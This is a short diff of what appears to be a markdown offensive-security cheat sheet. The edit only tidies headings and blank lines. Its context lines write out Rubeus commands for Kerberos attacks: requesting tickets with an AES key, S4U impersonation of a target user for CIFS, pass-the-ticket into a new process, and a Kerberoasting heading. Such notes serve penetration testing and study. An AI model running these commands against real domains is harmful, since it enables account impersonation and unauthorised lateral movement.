@@ -40,17 +40,15 @@ Invoke-Rubeus -Command 'asktgt /user:<user> /domain:<domain> /aes256:<aes> /dc:<
 Invoke-Rubeus -Command 's4u /impersonateuser:<targetUser> /msdsspn:http/<fqdnRhost> /ticket:<base64> /altservice:cifs'
 ```
 
-
 ### Create new process
 ```
 Invoke-Rubeus -Command 'createnetonly /program:C:\Windows\System32\cmd.exe'
 ```
 
-#### pass a ticket to the process
+### Pass a ticket to the process
 ```
 Invoke-Rubeus -Command 'ptt /luid:<luid> /ticket:<base64>'
 ```
-
 
 ### Kerberoasting using john format
 ```
